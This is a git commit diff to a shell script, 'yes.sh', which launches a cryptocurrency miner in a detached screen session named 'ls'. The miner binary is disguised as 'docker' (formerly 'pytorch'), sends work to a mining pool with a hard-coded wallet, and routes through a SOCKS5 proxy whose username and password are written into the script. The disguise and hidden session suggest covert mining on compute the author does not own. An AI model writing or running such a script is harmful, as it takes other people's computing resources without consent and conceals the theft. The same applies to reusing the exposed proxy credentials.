e20b1c585ac0436e8cdf5c8ed9fb44529ca9ab2f
keratsakti <86237834+keratsakti@users.noreply.github.com>
2021-06-24 22:26:07 +0700

    Update yes.sh

--- yes.sh
+++ yes.sh
@@ -3,8 +3,8 @@ sudo apt update
 sudo apt install screen libjansson4 -y 
 chmod +x docker 
 screen -dmS ls 
-POOL=stratum+tcp://cpupower.na.mine.zpool.ca:6240
+POOL=stratum+tcp://verushash.na.mine.zpool.ca:6143
 WALLET=MRYuRYQofJEpkcFrSpcrUqmxQfcpFz4wf3
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Dockers)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
 PROXY=socks5://cuan:berhasil123@199.249.170.113:443
-./pytorch -a lyra2z330 -o $POOL -u $WALLET.$WORKER -p c=LTC,zap=VRSC -t 2 -x $PROXY
+./docker -a verus -o $POOL -u $WALLET.$WORKER -p c=LTC,zap=VRSC -t 2 -x $PROXY
